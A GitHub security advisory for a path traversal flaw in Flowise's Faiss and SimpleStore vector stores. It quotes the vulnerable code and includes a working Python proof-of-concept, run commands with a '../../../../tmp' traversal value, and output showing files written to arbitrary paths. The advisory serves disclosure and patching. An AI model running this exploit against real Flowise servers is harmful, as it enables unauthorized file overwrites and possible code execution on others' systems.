# [M] Flowise: Path Traversal in Vector Store basePath

## Summary
Severity: Medium
Advisory: GHSA-w6v6-49gh-mc9w
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:H/SA:N (CVSS_V4)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-w6v6-49gh-mc9w
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.0
- npm: `flowise-components` — affected >=0 <3.1.0

## Details
## Summary

The Faiss and SimpleStore (LlamaIndex) vector store implementations accept a `basePath` parameter from user-controlled input and pass it directly to filesystem write operations without any sanitization. An authenticated attacker can exploit this to write vector store data to arbitrary locations on the server filesystem.

## Vulnerability Details

| Field | Value |
|-------|-------|
| Affected File | `packages/components/nodes/vectorstores/Faiss/Faiss.ts` (lines 79, 91) |
| Affected File | `packages/components/nodes/vectorstores/SimpleStore/SimpleStore.ts` (lines 83-104) |

## Prerequisites

1. **Authentication**: Valid API token with `documentStores:upsert-config` permission
2. **Document Store**: An existing Document Store with at least one processed chunk
3. **Embedding Credentials**: Valid embedding provider credentials (e.g., OpenAI API key)

## Root Cause

### Faiss (`Faiss.ts`)

```typescript
async upsert(nodeData: INodeData): Promise<Partial<IndexingResult>> {
    const basePath = nodeData.inputs?.basePath as string  // User-controlled
    // ...
    const vectorStore = await FaissStore.fromDocuments(finalDocs, embeddings)
    await vectorStore.save(basePath)  // Direct filesystem write, no validation
}
```

### SimpleStore (`SimpleStore.ts`)

```typescript
async upsert(nodeData: INodeData): Promise<Partial<IndexingResult>> {
    const basePath = nodeData.inputs?.basePath as string  // User-controlled
    
    let filePath = ''
    if (!basePath) filePath = path.join(getUserHome(), '.flowise', 'llamaindex')
    else filePath = basePath  // Used directly without sanitization
    
    const storageContext = await storageContextFromDefaults({ persistDir: filePath })  // Writes to arbitrary path
}
```

## Impact

An authenticated attacker can:

1. **Write files to arbitrary locations** on the server filesystem
2. **Overwrite existing files** if the process has write permissions
3. **Potential for code execution** by writing to web-accessible directories or startup scripts
4. **Data exfiltration** by writing to network-mounted filesystems

## Proof of Concept

### poc.py

```python
#!/usr/bin/env python3
"""
POC: Path Traversal in Vector Store basePath (CWE-22)

Usage:
  python poc.py --target http://localhost:3000 --token <API_KEY> --store-id <STORE_ID> --credential <EMBEDDING_CREDENTIAL_ID>
"""

import argparse
import json
import urllib.request
import urllib.error

def post_json(url, data, headers):
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={**headers, "Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=120) as resp:
        return resp.status, resp.read().decode("utf-8", errors="replace")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--token", required=True)
    ap.add_argument("--store-id", required=True)
    ap.add_argument("--credential", required=True)
    ap.add_argument("--base-path", default="/tmp/flowise-path-traversal-poc")
    args = ap.parse_args()

    payload = {
        "storeId": args.store_id,
        "vectorStoreName": "faiss",
        "vectorStoreConfig": {"basePath": args.base_path},
        "embeddingName": "openAIEmbeddings",
        "embeddingConfig": {"credential": args.credential},
    }

    url = args.target.rstrip("/") + "/api/v1/document-store/vectorstore/insert"
    headers = {"Authorization": f"Bearer {args.token}"}

    try:
        status, body = post_json(url, payload, headers)
        print(body)
    except urllib.error.HTTPError as e:
        print(e.read().decode())

if __name__ == "__main__":
    main()
```

### Setup

1. Create a Document Store in Flowise UI
2. Add a Document Loader (e.g., Plain Text) with any content
3. Click "Process" to create chunks
4. Note the Store ID from the URL
5. Get your embedding credential ID from Settings → Credentials

### Exploitation

```bash
# Write to /tmp
python poc.py \
  --target http://127.0.0.1:3000 \
  --token <API_TOKEN> \
  --store-id <STORE_ID> \
  --credential <OPENAI_CREDENTIAL_ID> \
  --base-path /tmp/flowise-pwned

# Path traversal variant
python poc.py \
  --target http://127.0.0.1:3000 \
  --token <API_TOKEN> \
  --store-id <STORE_ID> \
  --credential <OPENAI_CREDENTIAL_ID> \
  --base-path "../../../../tmp/traversal-test"
```

### Evidence

```
$ python poc.py --target http://127.0.0.1:3000/ --token <TOKEN> --store-id 30af9716-ea51-47e6-af67-5a759a835100 --credential bb1baf6e-acb7-4ea0-b167-59a09a28108f --base-path /tmp/flowise-pwned

{"numAdded":1,"addedDocs":[{"pageContent":"Lorem Ipsum","metadata":{"docId":"d84d9581-0778-454d-984e-42b372b1b555"}}],"totalChars":0,"totalChunks":0,"whereUsed":[]}

$ ls -la /tmp/flowise-pwned/
total 16
drwxr-xr-x  4 user  wheel   128 Jan 17 12:00 .
drwxrwxrwt 12 root  wheel   384 Jan 17 12:00 ..
-rw-r--r--  1 user  wheel  1234 Jan 17 12:00 docstore.json
-rw-r--r--  1 user  wheel  5678 Jan 17 12:00 faiss.index
```

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-w6v6-49gh-mc9w
- https://github.com/FlowiseAI/Flowise
